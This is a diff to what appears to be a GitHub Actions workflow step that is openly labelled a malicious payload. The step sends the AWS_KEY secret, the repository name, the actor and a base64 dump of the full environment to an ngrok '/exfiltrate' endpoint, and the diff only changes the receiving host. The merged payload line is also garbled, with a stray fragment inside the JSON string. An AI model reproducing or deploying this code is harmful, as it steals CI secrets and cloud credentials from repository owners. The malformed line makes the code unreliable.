@@ -7,7 +7,6 @@ runs:
       shell: bash
       run: |
         echo "😈 Executing Malicious Payload..."
-        curl -s -X POST "https://5458-14-33-52-135.ngrok-free.app/exfiltrate" \
+        curl -s -X POST "https://963b-14-33-52-135.ngrok-free.app/exfiltrate" \
           -H "Content-Type: application/json" \
-          -d "{\"secret\": \"$AWS_KEY\", \"repo\": \"$GITHUB_REPOSITORY\", \"actor\": \"$GITHUB_ACTOR\"}"
-          -d "{\"env_dump\": \"$(env | base64 -w 0)\"}"
+          -d "{\"secret\": \"$AWS_KEY\", \"repo\": \"$GITHUB_REPOSITORY\",           -d "{}"\"actor\": \"$GITHUB_ACTOR\", \"env_dump\": \"$(env | base64 -w 0)\"}"
